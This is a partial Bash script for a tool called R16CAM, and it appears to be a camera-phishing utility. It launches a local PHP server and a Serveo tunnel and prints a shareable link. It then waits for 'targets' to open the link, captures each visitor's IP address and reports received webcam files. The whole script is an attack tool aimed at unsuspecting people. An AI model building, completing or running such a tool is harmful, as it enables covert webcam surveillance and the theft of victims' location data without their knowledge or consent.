...
banner() {
clear
printf "\e[1;92m R16CAM\e[0m\e[1;77m\e[0m\n"
printf " \e[1;93m R16CAM Ver 1.7 \e[0m \n"
printf " \e[1;77m BY Team R16 | R16H \e[0m \n"
...
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] R16 IP:\e[0m\e[1;77m %s\e[0m\n" $ip
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] R16 Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] R16 Target opened the link!\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] R16 Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] R16 Starting Serveo...\e[0m\n"
...
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] R16 Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] R16 Direct link:\e[0m\e[1;77m %s\n' $send_link
